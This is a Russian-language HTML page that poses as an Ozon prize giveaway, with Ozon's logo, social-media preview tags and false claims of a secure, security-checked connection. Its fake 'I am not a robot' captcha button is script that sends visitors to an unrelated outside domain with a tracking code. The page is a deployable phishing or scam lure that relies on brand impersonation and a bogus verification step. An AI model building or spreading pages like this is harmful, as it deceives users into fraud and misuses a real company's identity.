<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Open Graph для красивого превью в VK и других мессенджерах -->
    <meta property="og:title" content="OZON ВАША ОЧЕРЕДЬ ЗАБРАТЬ НАГРАДУ">
    <meta property="og:description" content="Соединение установлено. Нажмите, чтобы получить подарок.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Ozon.ru_logo.svg/1200px-Ozon.ru_logo.svg.png">
    <meta property="og:url" content="https://vk-captcha-redirect-2026.github.io/ozon-podarok2026/">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="OZON">
    
    <!-- Twitter Card (дополнительно) -->
    <meta name="twitter:card" content="summary_large_image">
    
    <title>OZON ВАША ОЧЕРЕДЬ ЗАБРАТЬ НАГРАДУ</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #f5f7fa, #e4e9f2);
            font-family: 'Roboto', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .card {
            background: white;
            width: 100%;
            max-width: 420px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 40px 30px;
            text-align: center;
        }
        
        .logo {
            width: 90px;
            height: 90px;
            margin: 0 auto 25px;
        }
        
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #FF6600;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 { 
            font-size: 24px; 
            margin: 15px 0; 
            color: #333; 
        }
        
        p { 
            color: #666; 
            line-height: 1.5; 
            margin: 8px 0; 
        }
        
        .status { 
            color: #34C759; 
            font-weight: 500; 
            margin: 20px 0; 
        }

        /* reCAPTCHA Style */
        .recaptcha-btn {
            display: inline-flex;
            align-items: center;
            background: #fff;
            border: 2px solid #c1c1c1;
            border-radius: 4px;
            padding: 11px 16px;
            font-size: 15px;
            font-weight: 400;
            color: #555;
            cursor: pointer;
            margin-top: 30px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
            transition: all 0.3s;
        }
        
        .recaptcha-btn:hover {
            border-color: #FF6600;
        }
        
        .checkbox {
            width: 22px;
            height: 22px;
            border: 2px solid #757575;
            border-radius: 3px;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        
        .checkbox.checked {
            background: #34C759;
            border-color: #34C759;
        }
        
        .check-mark {
            color: white;
            font-size: 18px;
            font-weight: bold;
            opacity: 0;
            transform: scale(0);
            transition: all 0.3s;
        }
        
        .checkbox.checked .check-mark {
            opacity: 1;
            transform: scale(1);
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Ozon Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Ozon.ru_logo.svg/1200px-Ozon.ru_logo.svg.png" 
             alt="OZON" class="logo" style="width: 110px; height: auto;">
        
        <div class="spinner"></div>
        
        <h1>OZON</h1>
        <h2 style="margin: 8px 0 20px; color: #FF6600; font-size: 22px;">
            ВАША ОЧЕРЕДЬ ЗАБРАТЬ НАГРАДУ
        </h2>
        
        <div class="status">Статус: Безопасное подключение</div>

        <!-- reCAPTCHA Button -->
        <div class="recaptcha-btn" id="captchaBtn">
            <div class="checkbox" id="checkbox">
                <span class="check-mark">✓</span>
            </div>
            Я не робот
        </div>
        
        <div style="margin-top: 50px; font-size: 13px; color: #999;">
            Ссылка проверена системой безопасности.<br>
            © 2026 OZON
        </div>
    </div>

    <script>
        const btn = document.getElementById('captchaBtn');
        const checkbox = document.getElementById('checkbox');

        btn.addEventListener('click', () => {
            checkbox.classList.add('checked');
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.85';
            
            setTimeout(() => {
                window.location.href = "https://edgarbarnes.com/?s=uYeJByJ16h";
            }, 900);
        });
    </script>
</body>
</html>
